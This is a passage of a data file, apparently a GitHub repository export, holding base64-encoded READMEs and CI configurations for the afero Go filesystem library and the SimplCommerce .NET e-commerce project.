cmVjdGx5IHBlcm1pdHRpbmcgdGhlIHJlcXVlc3QgaXMgd2l0aGluIHRoZSBj
YWNoZSBkdXJhdGlvbiBvZiB3aGVuIGl0IHdhcwpjcmVhdGVkIGluIHRoZSBv
dmVybGF5LgoKSWYgdGhlIGJhc2UgZmlsZXN5c3RlbSBpcyB3cml0ZWFibGUs
IGFueSBjaGFuZ2VzIHRvIGZpbGVzIHdpbGwgYmUKZG9uZSBmaXJzdCB0byB0
aGUgYmFzZSwgdGhlbiB0byB0aGUgb3ZlcmxheSBsYXllci4gV3JpdGUgY2Fs
bHMgdG8gb3BlbiBmaWxlCmhhbmRsZXMgbGlrZSBgV3JpdGUoKWAgb3IgYFRy
dW5jYXRlKClgIHRvIHRoZSBvdmVybGF5IGZpcnN0LgoKVG8gd3JpdGluZyBm
aWxlcyB0byB0aGUgb3ZlcmxheSBvbmx5LCB5b3UgY2FuIHVzZSB0aGUgb3Zl
cmxheSBGcyBkaXJlY3RseSAobm90CnZpYSB0aGUgdW5pb24gRnMpLgoKQ2Fj
aGUgZmlsZXMgaW4gdGhlIGxheWVyIGZvciB0aGUgZ2l2ZW4gdGltZS5EdXJh
dGlvbiwgYSBjYWNoZSBkdXJhdGlvbiBvZiAwCm1lYW5zICJmb3JldmVyIiBt
ZWFuaW5nIHRoZSBmaWxlIHdpbGwgbm90IGJlIHJlLXJlcXVlc3RlZCBmcm9t
IHRoZSBiYXNlIGV2ZXIuCgpBIHJlYWQtb25seSBiYXNlIHdpbGwgbWFrZSB0
aGUgb3ZlcmxheSBhbHNvIHJlYWQtb25seSBidXQgc3RpbGwgY29weSBmaWxl
cwpmcm9tIHRoZSBiYXNlIHRvIHRoZSBvdmVybGF5IHdoZW4gdGhleSdyZSBu
b3QgcHJlc2VudCAob3Igb3V0ZGF0ZWQpIGluIHRoZQpjYWNoaW5nIGxheWVy
LgoKYGBgZ28KYmFzZSA6PSBhZmVyby5OZXdPc0ZzKCkKbGF5ZXIgOj0gYWZl
cm8uTmV3TWVtTWFwRnMoKQp1ZnMgOj0gYWZlcm8uTmV3Q2FjaGVPblJlYWRG
cyhiYXNlLCBsYXllciwgMTAwICogdGltZS5TZWNvbmQpCmBgYAoKIyMjIENv
cHlPbldyaXRlRnMoKQoKVGhlIENvcHlPbldyaXRlRnMgaXMgYSByZWFkIG9u
bHkgYmFzZSBmaWxlIHN5c3RlbSB3aXRoIGEgcG90ZW50aWFsbHkKd3JpdGVh
YmxlIGxheWVyIG9uIHRvcC4KClJlYWQgb3BlcmF0aW9ucyB3aWxsIGZpcnN0
IGxvb2sgaW4gdGhlIG92ZXJsYXkgYW5kIGlmIG5vdCBmb3VuZCB0aGVyZSwg
d2lsbApzZXJ2ZSB0aGUgZmlsZSBmcm9tIHRoZSBiYXNlLgoKQ2hhbmdlcyB0
byB0aGUgZmlsZSBzeXN0ZW0gd2lsbCBvbmx5IGJlIG1hZGUgaW4gdGhlIG92
ZXJsYXkuCgpBbnkgYXR0ZW1wdCB0byBtb2RpZnkgYSBmaWxlIGZvdW5kIG9u
bHkgaW4gdGhlIGJhc2Ugd2lsbCBjb3B5IHRoZSBmaWxlIHRvIHRoZQpvdmVy
bGF5IGxheWVyIGJlZm9yZSBtb2RpZmljYXRpb24gKGluY2x1ZGluZyBvcGVu
aW5nIGEgZmlsZSB3aXRoIGEgd3JpdGFibGUKaGFuZGxlKS4KClJlbW92aW5n
IGFuZCBSZW5hbWluZyBmaWxlcyBwcmVzZW50IG9ubHkgaW4gdGhlIGJhc2Ug
bGF5ZXIgaXMgbm90IGN1cnJlbnRseQpwZXJtaXR0ZWQuIElmIGEgZmlsZSBp
cyBwcmVzZW50IGluIHRoZSBiYXNlIGxheWVyIGFuZCB0aGUgb3ZlcmxheSwg
b25seSB0aGUKb3ZlcmxheSB3aWxsIGJlIHJlbW92ZWQvcmVuYW1lZC4KCmBg
YGdvCgliYXNlIDo9IGFmZXJvLk5ld09zRnMoKQoJcm9CYXNlIDo9IGFmZXJv
Lk5ld1JlYWRPbmx5RnMoYmFzZSkKCXVmcyA6PSBhZmVyby5OZXdDb3B5T25X
cml0ZUZzKHJvQmFzZSwgYWZlcm8uTmV3TWVtTWFwRnMoKSkKCglmaCwgXyA9
IHVmcy5DcmVhdGUoIi9ob21lL3Rlc3QvZmlsZTIudHh0IikKCWZoLldyaXRl
U3RyaW5nKCJUaGlzIGlzIGEgdGVzdCIpCglmaC5DbG9zZSgpCmBgYAoKSW4g
dGhpcyBleGFtcGxlIGFsbCB3cml0ZSBvcGVyYXRpb25zIHdpbGwgb25seSBv
Y2N1ciBpbiBtZW1vcnkgKE1lbU1hcEZzKQpsZWF2aW5nIHRoZSBiYXNlIGZp
bGVzeXN0ZW0gKE9zRnMpIHVudG91Y2hlZC4KCgojIyBEZXNpcmVkL3Bvc3Np
YmxlIGJhY2tlbmRzCgpUaGUgZm9sbG93aW5nIGlzIGEgc2hvcnQgbGlzdCBv
ZiBwb3NzaWJsZSBiYWNrZW5kcyB3ZSBob3BlIHNvbWVvbmUgd2lsbAppbXBs
ZW1lbnQ6CgoqIFNTSAoqIFpJUAoqIFRBUgoqIFMzCgojIEFib3V0IHRoZSBw
cm9qZWN0CgojIyBXaGF0J3MgaW4gdGhlIG5hbWUKCkFmZXJvIGNvbWVzIGZy
b20gdGhlIGxhdGluIHJvb3RzIEFkLUZhY2VyZS4KCioqIkFkIioqIGlzIGEg
cHJlZml4IG1lYW5pbmcgInRvIi4KCioqIkZhY2VyZSIqKiBpcyBhIGZvcm0g
b2YgdGhlIHJvb3QgImZhY2nFjSIgbWFraW5nICJtYWtlIG9yIGRvIi4KClRo
ZSBsaXRlcmFsIG1lYW5pbmcgb2YgYWZlcm8gaXMgInRvIG1ha2UiIG9yICJ0
byBkbyIgd2hpY2ggc2VlbXMgdmVyeSBmaXR0aW5nCmZvciBhIGxpYnJhcnkg
dGhhdCBhbGxvd3Mgb25lIHRvIG1ha2UgZmlsZXMgYW5kIGRpcmVjdG9yaWVz
IGFuZCBkbyB0aGluZ3Mgd2l0aCB0aGVtLgoKVGhlIEVuZ2xpc2ggd29yZCB0
aGF0IHNoYXJlcyB0aGUgc2FtZSByb290cyBhcyBBZmVybyBpcyAiYWZmYWly
Ii4gQWZmYWlyIHNoYXJlcwp0aGUgc2FtZSBjb25jZXB0IGJ1dCBhcyBhIG5v
dW4gaXQgbWVhbnMgInNvbWV0aGluZyB0aGF0IGlzIG1hZGUgb3IgZG9uZSIg
b3IgImFuCm9iamVjdCBvZiBhIHBhcnRpY3VsYXIgdHlwZSIuCgpJdCdzIGFs
c28gbmljZSB0aGF0IHVubGlrZSBzb21lIG9mIG15IG90aGVyIGxpYnJhcmll
cyAoaHVnbywgY29icmEsIHZpcGVyKSBpdApHb29nbGVzIHZlcnkgd2VsbC4K
CiMjIFJlbGVhc2UgTm90ZXMKCiogKiowLjEwLjAqKiAyMDE1LjEyLjEwCiAg
KiBGdWxsIGNvbXBhdGliaWxpdHkgd2l0aCBXaW5kb3dzCiAgKiBJbnRyb2R1
Y3Rpb24gb2YgYWZlcm8gdXRpbGl0aWVzCiAgKiBUZXN0IHN1aXRlIHJld3Jp
dHRlbiB0byB3b3JrIGNyb3NzIHBsYXRmb3JtCiAgKiBOb3JtYWxpemUgcGF0
aHMgZm9yIE1lbU1hcEZzCiAgKiBBZGRpbmcgU3luYyB0byB0aGUgZmlsZSBp
bnRlcmZhY2UKICAqICoqQnJlYWtpbmcgQ2hhbmdlKiogV2FsayBhbmQgUmVh
ZERpciBoYXZlIGNoYW5nZWQgcGFyYW1ldGVyIG9yZGVyCiAgKiBNb3Zpbmcg
dHlwZXMgdXNlZCBieSBNZW1NYXBGcyB0byBhIHN1YnBhY2thZ2UKICAqIEdl
bmVyYWwgYnVnZml4ZXMgYW5kIGltcHJvdmVtZW50cwoqICoqMC45LjAqKiAy
MDE1LjExLjA1CiAgKiBOZXcgV2FsayBmdW5jdGlvbiBzaW1pbGFyIHRvIGZp
bGVwYXRoLldhbGsKICAqIE1lbU1hcEZzLk9wZW5GaWxlIGhhbmRsZXMgT19D
UkVBVEUsIE9fQVBQRU5ELCBPX1RSVU5DCiAgKiBNZW1NYXBGcy5SZW1vdmUg
bm93IHJlYWxseSBkZWxldGVzIHRoZSBmaWxlCiAgKiBJbk1lbW9yeUZpbGUu
UmVhZGRpciBhbmQgUmVhZGRpcm5hbWVzIHdvcmsgY29ycmVjdGx5CiAgKiBJ
bk1lbW9yeUZpbGUgZnVuY3Rpb25zIGxvY2sgaXQgZm9yIGNvbmN1cnJlbnQg
YWNjZXNzCiAgKiBUZXN0IHN1aXRlIGltcHJvdmVtZW50cwoqICoqMC44LjAq
KiAyMDE0LjEwLjI4CiAgKiBGaXJzdCBwdWJsaWMgdmVyc2lvbgogICogSW50
ZXJmYWNlcyBmZWVsIHJlYWR5IGZvciBwZW9wbGUgdG8gYnVpbGQgdXNpbmcK
ICAqIEludGVyZmFjZXMgc2F0aXNmeSBhbGwga25vd24gdXNlcwogICogTWVt
TWFwRnMgcGFzc2VzIHRoZSBtYWpvcml0eSBvZiB0aGUgT1MgdGVzdCBzdWl0
ZQogICogT3NGcyBwYXNzZXMgdGhlIG1ham9yaXR5IG9mIHRoZSBPUyB0ZXN0
IHN1aXRlCgojIyBDb250cmlidXRpbmcKCjEuIEZvcmsgaXQKMi4gQ3JlYXRl
IHlvdXIgZmVhdHVyZSBicmFuY2ggKGBnaXQgY2hlY2tvdXQgLWIgbXktbmV3
LWZlYXR1cmVgKQozLiBDb21taXQgeW91ciBjaGFuZ2VzIChgZ2l0IGNvbW1p
dCAtYW0gJ0FkZCBzb21lIGZlYXR1cmUnYCkKNC4gUHVzaCB0byB0aGUgYnJh
bmNoIChgZ2l0IHB1c2ggb3JpZ2luIG15LW5ldy1mZWF0dXJlYCkKNS4gQ3Jl
YXRlIG5ldyBQdWxsIFJlcXVlc3QKCiMjIENvbnRyaWJ1dG9ycwoKTmFtZXMg
aW4gbm8gcGFydGljdWxhciBvcmRlcjoKCiogW3NwZjEzXShodHRwczovL2dp
dGh1Yi5jb20vc3BmMTMpCiogW2phcXgwcl0oaHR0cHM6Ly9naXRodWIuY29t
L2phcXgwcikKKiBbbWJlcnRzY2hsZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9t
YmVydHNjaGxlcikKKiBbeG9yLWdhdGVdKGh0dHBzOi8vZ2l0aHViLmNvbS94
b3ItZ2F0ZSkKCiMjIExpY2Vuc2UKCkFmZXJvIGlzIHJlbGVhc2VkIHVuZGVy
IHRoZSBBcGFjaGUgMi4wIGxpY2Vuc2UuIFNlZQpbTElDRU5TRS50eHRdKGh0
dHBzOi8vZ2l0aHViLmNvbS9zcGYxMy9hZmVyby9ibG9iL21hc3Rlci9MSUNF
TlNFLnR4dCkK
",,"c3VkbzogZmFsc2UNCmxhbmd1YWdlOiBnbw0KDQpnbzoNCiAgLSAxLjkNCiAg
LSAiMS4xMCINCiAgLSB0aXANCg0Kb3M6DQogIC0gbGludXgNCiAgLSBvc3gN
Cg0KbWF0cml4Og0KICBhbGxvd19mYWlsdXJlczoNCiAgICAtIGdvOiB0aXAN
CiAgZmFzdF9maW5pc2g6IHRydWUNCg0Kc2NyaXB0Og0KICAtIGdvIGJ1aWxk
DQogIC0gZ28gdGVzdCAtcmFjZSAtdiAuLy4uLg0KDQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'SimplCommerce',59361967,"b'A simple, cross platform, modularized ecommerce system built on .NET Core'",b'C#',76,2400,,2400,False,b'https://api.github.com/repos/simplcommerce/SimplCommerce/forks',"IyBBIHNpbXBsZSwgY3Jvc3MgcGxhdGZvcm0sIG1vZHVsYXJpemVkIGVjb21t
ZXJjZSBzeXN0ZW0gYnVpbHQgb24gLk5FVCBDb3JlIFshW0pvaW4gdGhlIGNo
YXQgYXQgaHR0cHM6Ly9naXR0ZXIuaW0vc2ltcGxjb21tZXJjZS9TaW1wbENv
bW1lcmNlXShodHRwczovL2JhZGdlcy5naXR0ZXIuaW0vc2ltcGxjb21tZXJj
ZS9TaW1wbENvbW1lcmNlLnN2ZyldKGh0dHBzOi8vZ2l0dGVyLmltL3NpbXBs
Y29tbWVyY2UvU2ltcGxDb21tZXJjZT91dG1fc291cmNlPWJhZGdlJnV0bV9t
ZWRpdW09YmFkZ2UmdXRtX2NhbXBhaWduPXByLWJhZGdlJnV0bV9jb250ZW50
PWJhZGdlKQoKIyMgSGlnaCBsZXZlbCBhcmNoaXRlY3R1cmUKCiFbU2ltcGxl
Q29tbWVyY2UgLSBNb2R1bGFyIGFyY2hpdGVjdHVyZV0oaHR0cHM6Ly9yYXcu
Z2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsY29tbWVyY2UvU2ltcGxDb21t
ZXJjZS9tYXN0ZXIvbW9kdWxhci1hcmNoaXRlY3R1cmUucG5nKQoKIyMgQnVp
bGQgU3RhdHVzCnwgQnVpbGQgc2VydmVyICAgIHwgUGxhdGZvcm0gICAgICAg
fCBTdGF0dXMgICAgICB8CnwtLS0tLS0tLS0tLS0tLS0tLXwtLS0tLS0tLS0t
LS0tLS0tfC0tLS0tLS0tLS0tLS18CnwgQXp1cmUgUGlwZWxpbmVzIHwgQWxs
ICAgICAgICAgICAgfFshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly9zaW1wbGNv
bW1lcmNlLnZpc3VhbHN0dWRpby5jb20vc2ltcGxjb21tZXJjZS9fYXBpcy9i
dWlsZC9zdGF0dXMvc2ltcGxjb21tZXJjZS5TaW1wbENvbW1lcmNlP2JyYW5j
aE5hbWU9bWFzdGVyKV0oaHR0cHM6Ly9zaW1wbGNvbW1lcmNlLnZpc3VhbHN0
dWRpby5jb20vc2ltcGxjb21tZXJjZS9fYnVpbGQvbGF0ZXN0P2RlZmluaXRp
b25JZD0xJmJyYW5jaE5hbWU9bWFzdGVyKQp8VHJhdmlzICAgICAgICAgICB8
IExpbnV4IC8gTWFjT1MgIHxbIVtCdWlsZCBTdGF0dXNdKGh0dHBzOi8vdHJh
dmlzLWNpLm9yZy9zaW1wbGNvbW1lcmNlL1NpbXBsQ29tbWVyY2Uuc3ZnP2Jy
YW5jaD1tYXN0ZXIpXShodHRwczovL3RyYXZpcy1jaS5vcmcvc2ltcGxjb21t
ZXJjZS9TaW1wbENvbW1lcmNlKSB8CgojIyBPbmxpbmUgZGVtbyAoQXp1cmUg
V2Vic2l0ZSkKLSBTdG9yZSBmcm9udDogaHR0cDovL2RlbW8uc2ltcGxjb21t
ZXJjZS5jb20KLSBBZG1pbmlzdHJhdGlvbjogaHR0cDovL2RlbW8uc2ltcGxj
b21tZXJjZS5jb20vYWRtaW4gRW1haWw6IGFkbWluQHNpbXBsY29tbWVyY2Uu
Y29tIFBhc3N3b3JkOiAxcWF6WkFRIQoKIyMgRG9ja2VyCgpGb3IgdGVzdGlu
ZyBwdXJwb3NlIG9ubHkgYGRvY2tlciBydW4gLXAgNTAwMDo4MCBzaW1wbGNv
bW1lcmNlL2NpLWJ1aWxkYAoKQ29udGludW91cyBkZXBsb3ltZW50OiBodHRw
czovL2NpLnNpbXBsY29tbWVyY2UuY29tCgojIyBWaXN1YWwgU3R1ZGlvIDIw
MTkgYW5kIFNRTCBTZXJ2ZXIKCiMjIyMgUHJlcmVxdWlzaXRlcwoKLSBTUUwg
U2VydmVyCi0gW1Zpc3VhbCBTdHVkaW8gMjAxOSB2ZXJzaW9uID49IDE2LjIg
d2l0aCAuTkVUIENvcmUgU0RLIDMuMC4xMDBdKGh0dHBzOi8vd3d3Lm1pY3Jv
c29mdC5jb20vbmV0L2Rvd25sb2FkL2FsbCkKCiMjIyMgU3RlcHMgdG8gcnVu
CgotIFVwZGF0ZSB0aGUgY29ubmVjdGlvbiBzdHJpbmcgaW4gYXBwc2V0dGlu
Z3MuanNvbiBpbiBTaW1wbENvbW1lcmNlLldlYkhvc3QKLSBCdWlsZCB3aG9s
ZSBzb2x1dGlvbi4KLSBJbiBTb2x1dGlvbiBFeHBsb3JlciwgbWFrZSBzdXJl
IHRoYXQgU2ltcGxDb21tZXJjZS5XZWJIb3N0IGlzIHNlbGVjdGVkIGFzIHRo
ZSBTdGFydHVwIFByb2plY3QKLSBPcGVuIFBhY2thZ2UgTWFuYWdlciBDb25z
b2xlIFdpbmRvdyBhbmQgbWFrZSBzdXJlIHRoYXQgU2ltcGxDb21tZXJjZS5X
ZWJIb3N0IGlzIHNlbGVjdGVkIGFzIERlZmF1bHQgcHJvamVjdC4gVGhlbiB0
eXBlICJVcGRhdGUtRGF0YWJhc2UiIHRoZW4gcHJlc3MgIkVudGVyIi4gVGhp
cyBhY3Rpb24gd2lsbCBjcmVhdGUgZGF0YWJhc2Ugc2NoZW1hLgotIEluIFZp
c3VhbCBTdHVkaW8sIHByZXNzICJDb250cm9sICsgRjUiLgotIFRoZSBiYWNr
LW9mZmljZSBjYW4gYWNjZXNzIHZpYSAvQWRtaW4gdXNpbmcgdGhlIHByZS1j
cmVhdGVkIGFjY291bnQ6IGFkbWluQHNpbXBsY29tbWVyY2UuY29tLCAxcWF6
WkFRIQoKIyMgTWFjL0xpbnV4IHdpdGggUG9zdGdyZVNRTAoKIyMjIyBQcmVy
ZXF1aXNpdGUKCi0gUG9zdGdyZVNRTAotIFsuTkVUIENvcmUgU0RLIDMuMC4x
MDBdKGh0dHBzOi8vd3d3Lm1pY3Jvc29mdC5jb20vbmV0L2Rvd25sb2FkL2Fs
bCkKCiMjIyMgU3RlcHMgdG8gcnVuCgotIFVwZGF0ZSB0aGUgY29ubmVjdGlv
biBzdHJpbmcgaW4gYXBwc2V0dGluZ3MuanNvbiBpbiBTaW1wbENvbW1lcmNl
LldlYkhvc3QuCi0gUnVuIGZpbGUgc2ltcGwtYnVpbGQuc2ggYnkgInN1ZG8g
Li9zaW1wbC1idWlsZC5zaCIuIEZvciB1YnVudHUgMTggInN1ZG8gYmFzaCBz
aW1wbC1idWlsZC5zaCIKLSBJbiB0aGUgdGVybWluYWwsIG5hdmlnYXRlIHRv
IHRoZSAic3JjL1NpbXBsQ29tbWVyY2UuV2ViSG9zdCIgdHlwZSAiZG90bmV0
IHJ1biIgYW5kIGhpdCAiRW50ZXIiLgotIE9wZW4gYnJvd3Nlciwgb3BlbiBo
dHRwOi8vbG9jYWxob3N0OjUwMDAuIFRoZSBiYWNrLW9mZmljZSBjYW4gYWNj
ZXNzIHZpYSAvQWRtaW4gdXNpbmcgdGhlIHByZS1jcmVhdGVkIGFjY291bnQ6
IGFkbWluQHNpbXBsY29tbWVyY2UuY29tLCAxcWF6WkFRIQoKIyMgVGVjaG5v
bG9naWVzIGFuZCBmcmFtZXdvcmtzIHVzZWQ6CgotIEFTUC5ORVQgTVZDIENv
cmUgMy4wCi0gRW50aXR5IEZyYW1ld29yayBDb3JlIDMuMAotIEFTUC5ORVQg
SWRlbnRpdHkgQ29yZSAzLjAKLSBBbmd1bGFyIDEuNi4zCi0gTWVkaWF0UiA3
LjAuMCBmb3IgZG9tYWluIGV2ZW50CgojIyBEb2NzCgpodHRwOi8vZG9jcy5z
aW1wbGNvbW1lcmNlLmNvbQoKIyMgUm9hZG1hcAoKaHR0cHM6Ly9naXRodWIu
Y29tL3NpbXBsY29tbWVyY2UvU2ltcGxDb21tZXJjZS93aWtpL1JvYWRtYXAK
CiMjIEhvdyB0byBjb250cmlidXRlCgotIFN0YXIgdGhpcyBwcm9qZWN0IG9u
IEdpdEh1Yi4KLSBSZXBvcnQgYnVncyBvciBzdWdnZXN0IGZlYXR1cmVzIGJ5
IGNyZWF0ZSBuZXcgaXNzdWVzIG9yIGFkZCBjb21tZW50cyB0byBpc3N1ZXMK
LSBTdWJtaXQgcHVsbCByZXF1ZXN0cwotIFNwcmVhZCB0aGUgd29yZCBieSBi
bG9nZ2luZyBhYm91dCBTaW1wbENvbW1lcmNlIG9yIHNoYXJpbmcgaXQgb24g
c29jaWFsIG5ldHdvcmtzCi0gRG9uYXRlIHVzCgojIyBDb250cmlidXRvcnMK
ClRoaXMgcHJvamVjdCBleGlzdHMgdGhhbmtzIHRvIGFsbCB0aGUgcGVvcGxl
IHdobyBjb250cmlidXRlLgoKPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29t
L3NpbXBsY29tbWVyY2UvU2ltcGxDb21tZXJjZS9ncmFwaHMvY29udHJpYnV0
b3JzIj48aW1nIHNyYz0iaHR0cHM6Ly9vcGVuY29sbGVjdGl2ZS5jb20vc2lt
cGxjb21tZXJjZS9jb250cmlidXRvcnMuc3ZnP3dpZHRoPTg5MCIgdGl0bGU9
ImNvbnRyaWJ1dG9ycyIgYWx0PSJjb250cmlidXRvcnMiIC8+PC9hPgoKIyMg
QmFja2VycwoKTG92ZSBvdXIgd29yayBhbmQgaGVscCB1cyBjb250aW51ZSBv
dXIgYWN0aXZpdGllcz8gW1tCZWNvbWUgYSBiYWNrZXJdKGh0dHBzOi8vb3Bl
bmNvbGxlY3RpdmUuY29tL3NpbXBsY29tbWVyY2UjYmFja2VyKV0KCjxhIGhy
ZWY9Imh0dHBzOi8vb3BlbmNvbGxlY3RpdmUuY29tL3NpbXBsY29tbWVyY2Uj
YmFja2VycyIgdGFyZ2V0PSJfYmxhbmsiPjxpbWcgc3JjPSJodHRwczovL29w
ZW5jb2xsZWN0aXZlLmNvbS9zaW1wbGNvbW1lcmNlL2JhY2tlcnMuc3ZnP3dp
ZHRoPTg5MCI+PC9hPgoKIyMgU3BvbnNvcnMKCkJlY29tZSBhIHNwb25zb3Ig
YW5kIGdldCB5b3VyIGxvZ28gb24gb3VyIFJFQURNRSBvbiBHaXRodWIgd2l0
aCBhIGxpbmsgdG8geW91ciBzaXRlLiBbW0JlY29tZSBhIHNwb25zb3JdKGh0
dHBzOi8vb3BlbmNvbGxlY3RpdmUuY29tL3NpbXBsY29tbWVyY2Ujc3BvbnNv
cildCgo8YSBocmVmPSJodHRwczovL29wZW5jb2xsZWN0aXZlLmNvbS9zaW1w
bGNvbW1lcmNlL3Nwb25zb3IvMC93ZWJzaXRlIiB0YXJnZXQ9Il9ibGFuayI+
PGltZyBzcmM9Imh0dHBzOi8vb3BlbmNvbGxlY3RpdmUuY29tL3NpbXBsY29t
bWVyY2Uvc3BvbnNvci8wL2F2YXRhci5zdmciPjwvYT4KPGEgaHJlZj0iaHR0
cHM6Ly9vcGVuY29sbGVjdGl2ZS5jb20vc2ltcGxjb21tZXJjZS9zcG9uc29y
LzEvd2Vic2l0ZSIgdGFyZ2V0PSJfYmxhbmsiPjxpbWcgc3JjPSJodHRwczov
L29wZW5jb2xsZWN0aXZlLmNvbS9zaW1wbGNvbW1lcmNlL3Nwb25zb3IvMS9h
dmF0YXIuc3ZnIj48L2E+CjxhIGhyZWY9Imh0dHBzOi8vb3BlbmNvbGxlY3Rp
dmUuY29tL3NpbXBsY29tbWVyY2Uvc3BvbnNvci8yL3dlYnNpdGUiIHRhcmdl
dD0iX2JsYW5rIj48aW1nIHNyYz0iaHR0cHM6Ly9vcGVuY29sbGVjdGl2ZS5j
b20vc2ltcGxjb21tZXJjZS9zcG9uc29yLzIvYXZhdGFyLnN2ZyI+PC9hPgo8
YSBocmVmPSJodHRwczovL29wZW5jb2xsZWN0aXZlLmNvbS9zaW1wbGNvbW1l
cmNlL3Nwb25zb3IvMy93ZWJzaXRlIiB0YXJnZXQ9Il9ibGFuayI+PGltZyBz
cmM9Imh0dHBzOi8vb3BlbmNvbGxlY3RpdmUuY29tL3NpbXBsY29tbWVyY2Uv
c3BvbnNvci8zL2F2YXRhci5zdmciPjwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9v
cGVuY29sbGVjdGl2ZS5jb20vc2ltcGxjb21tZXJjZS9zcG9uc29yLzQvd2Vi
c2l0ZSIgdGFyZ2V0PSJfYmxhbmsiPjxpbWcgc3JjPSJodHRwczovL29wZW5j
b2xsZWN0aXZlLmNvbS9zaW1wbGNvbW1lcmNlL3Nwb25zb3IvNC9hdmF0YXIu
c3ZnIj48L2E+CgojIyBMaWNlbnNlCgpTaW1wbENvbW1lcmNlIGlzIGxpY2Vu
c2VkIHVuZGVyIHRoZSBBcGFjaGUgMi4wIGxpY2Vuc2UuCg==
",,"bGFuZ3VhZ2U6IGNzaGFycApzb2x1dGlvbjogU2ltcGxDb21tZXJjZS5zbG4K
c3VkbzogcmVxdWlyZWQKZGlzdDogeGVuaWFsCmRvdG5ldDogMy4wLjEwMApt
b25vOiBub25lCm9zOgogIC0gbGludXgKCmJyYW5jaGVzOgogIG9ubHk6CiAg
ICAtIG1hc3RlcgoKbm90aWZpY2F0aW9uczoKICBlbWFpbDoKICAgIG9uX3N1
Y2Nlc3M6IGNoYW5nZQogICAgb25fZmFpbHVyZTogYWx3YXlzCgpiZWZvcmVf
c2NyaXB0OgogIC0gZG90bmV0IHJlc3RvcmUKCnNjcmlwdDoKICAtIGRvdG5l
dCBidWlsZCAuL1NpbXBsQ29tbWVyY2Uuc2xuCiAgLSAuL3J1bi10ZXN0cy5z
aAo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"IyBBU1AuTkVUIENvcmUKIyBCdWlsZCBhbmQgdGVzdCBBU1AuTkVUIENvcmUg
cHJvamVjdHMgdGFyZ2V0aW5nIC5ORVQgQ29yZS4KIyBBZGQgc3RlcHMgdGhh
dCBydW4gdGVzdHMsIGNyZWF0ZSBhIE51R2V0IHBhY2thZ2UsIGRlcGxveSwg
YW5kIG1vcmU6CiMgaHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vYXp1cmUv
ZGV2b3BzL3BpcGVsaW5lcy9sYW5ndWFnZXMvZG90bmV0LWNvcmUKCnRyaWdn
ZXI6Ci0gbWFzdGVyCgp2YXJpYWJsZXM6CiAgbmV0Q29yZVNka1ZlcnNpb246
ICczLjAuMTAwJwoKam9iczoKLSBqb2I6IExpbnV4CiAgcG9vbDoKICAgIHZt
SW1hZ2U6ICdVYnVudHUgMTYuMDQnCiAgc3RlcHM6CiAgLSB0YXNrOiBEb3RO
ZXRDb3JlSW5zdGFsbGVyQDAKICAgIGlucHV0czoKICAgICAgcGFja2FnZVR5
cGU6ICdzZGsnCiAgICAgIHZlcnNpb246ICQobmV0Q29yZVNka1ZlcnNpb24p
CiAgLSBzY3JpcHQ6IGRvdG5ldCBidWlsZCAuL1NpbXBsQ29tbWVyY2Uuc2xu
CiAgICBkaXNwbGF5TmFtZTogJ2RvdG5ldCBidWlsZCcKICAtIHNjcmlwdDog
Li9ydW4tdGVzdHMuc2gKICAgIGRpc3BsYXlOYW1lOiAncnVuIHRlc3RzJwog
IC0gdGFzazogUHVibGlzaFRlc3RSZXN1bHRzQDIKICAgIGRpc3BsYXlOYW1l
OiAnUHVibGlzaCBUZXN0IFJlc3VsdHMgKiovKi50cngnCiAgICBjb25kaXRp
b246IHN1Y2NlZWRlZE9yRmFpbGVkKCkKICAgIGlucHV0czoKICAgICAgdGVz
dFJlc3VsdHNGb3JtYXQ6IFZTVGVzdAogICAgICB0ZXN0UmVzdWx0c0ZpbGVz
OiAnKiovKi50cngnIAoKLSBqb2I6IG1hY09TCiAgcG9vbDoKICAgIHZtSW1h
Z2U6ICdtYWNPUy0xMC4xMycKICBzdGVwczoKICAtIHRhc2s6IERvdE5ldENv
cmVJbnN0YWxsZXJAMAogICAgaW5wdXRzOgogICAgICBwYWNrYWdlVHlwZTog
J3NkaycKICAgICAgdmVyc2lvbjogJChuZXRDb3JlU2RrVmVyc2lvbikKICAt
IHNjcmlwdDogZG90bmV0IGJ1aWxkIC4vU2ltcGxDb21tZXJjZS5zbG4KICAg
IGRpc3BsYXlOYW1lOiAnZG90bmV0IGJ1aWxkJwogIC0gc2NyaXB0OiAuL3J1
bi10ZXN0cy5zaAogICAgZGlzcGxheU5hbWU6ICdydW4gdGVzdHMnCiAgLSB0
YXNrOiBQdWJsaXNoVGVzdFJlc3VsdHNAMgogICAgZGlzcGxheU5hbWU6ICdQ
dWJsaXNoIFRlc3QgUmVzdWx0cyAqKi8qLnRyeCcKICAgIGNvbmRpdGlvbjog
c3VjY2VlZGVkT3JGYWlsZWQoKQogICAgaW5wdXRzOgogICAgICB0ZXN0UmVz
dWx0c0Zvcm1hdDogVlNUZXN0CiAgICAgIHRlc3RSZXN1bHRzRmlsZXM6ICcq
Ki8qLnRyeCcgCgotIGpvYjogV2luZG93cwogIHBvb2w6CiAgICB2bUltYWdl
OiAnd2luZG93cy0yMDE5JwogIHN0ZXBzOgogIC0gdGFzazogRG90TmV0Q29y
ZUluc3RhbGxlckAwCiAgICBpbnB1dHM6CiAgICAgIHBhY2thZ2VUeXBlOiAn
c2RrJwogICAgICB2ZXJzaW9uOiAkKG5ldENvcmVTZGtWZXJzaW9uKQogIC0g
c2NyaXB0OiBkb3RuZXQgYnVpbGQgLi9TaW1wbENvbW1lcmNlLnNsbgogICAg
ZGlzcGxheU5hbWU6ICdkb3RuZXQgYnVpbGQnCiAgLSB0YXNrOiBQb3dlclNo
